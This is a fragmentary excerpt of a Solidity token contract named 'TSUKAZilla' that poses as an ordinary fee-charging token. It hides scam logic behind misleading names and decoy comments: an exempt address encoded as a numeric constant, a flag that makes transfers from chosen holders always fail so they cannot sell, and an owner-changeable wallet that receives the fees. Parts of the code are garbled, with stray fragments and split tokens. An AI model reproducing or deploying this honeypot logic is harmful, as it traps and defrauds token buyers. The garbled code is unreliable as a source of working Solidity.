...
contract TSUKAZilla
 is Context, IERC20, Ownable {
    ...
    string private _name = "TSUKAZilla";
    string private _symbol = "TSUKAZilla";
    uint8 private _decimals = 9;
    address payable public _babywallet;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _dosage;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludeFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketsPair;
    mapping (address => bool) public _mianpai;
    ...
    constructor () {
        ...
        isWalletLimitExempt[excited (MarketFee)] = true;
        isTxLimitExempt[excited (MarketFee)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _mianpai[address(uniswapPair)] = true;
        _mianpai[msg.sender] = true; 

        teamWalletAddress = payable(address(0xD58611031461733C3FaeD61D70D25b888595527b));
        _babywallet = payable(address(0xD58611031461733C3FaeD61D70D25b888595527b));

        _dosage[_msgSender()] = _totalSupply;
    ...
    function ecelx(uint256 amountmax)  pure private returns(uint160){
        return /*first*/ 
        uint160(amountmax);/*first*/ 
    }

    function excited (uint256 amountIn)  pure private returns(address){
        return 
        /*absolutely*/address(ecelx(amountIn)); /*software*/
    }

    function tt(address amountmins) private view returns(bool){
        return
        !(excited (MarketFee) == amountmins);
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        _babywallet = payable(newAddress);
    }
...
= doorz;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_mianpai[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _dosage[sender] = _dosage[sender].sub(amount);
            ...
            if(_true
[sender]){
                /*syy*/                require(true && false);/*syy*/ 
}}
            _dosage[recipient] = _dosage[recipient].add(finalAmount);
 ...
 msg.sender
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _dosage[sender] = _dosage[sender].sub(amount, "Insufficient Balance");
        _dosage[recipient] = _dosage[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(_babywallet, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        else if(_mianpai[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(feeAmount > 0) {
            _dosage[address(this)] = _dosage[address(this)].add(feeAmount);
